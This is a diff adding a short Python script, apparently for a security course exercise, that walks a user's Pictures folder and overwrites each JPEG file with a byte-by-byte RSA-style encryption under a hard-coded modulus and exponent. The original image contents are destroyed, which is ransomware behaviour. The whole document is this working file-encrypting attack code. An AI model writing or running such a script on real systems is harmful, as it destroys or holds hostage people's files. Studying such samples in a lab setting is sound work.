@@ -1,0 +1,21 @@
+#!/usr/bin/env python3
+
+import sys
+import pickle
+from os import listdir
+
+n = 22291846172619859445381409012451
+e = 65535
+
+for file in listdir('/home/csc2023/Pictures/'):
+    if not file.endswith('.jpg'):
+        break
+
+    img_data = b''
+    with open(f'/home/csc2023/Pictures/{file}', 'rb') as f:
+        img_data = f.read()
+
+    cipher_int = [pow(i, e, n) for i in img_data]
+
+    with open(f'/home/csc2023/Pictures/{file}', 'wb') as f:
+        pickle.dump(cipher_int, f)
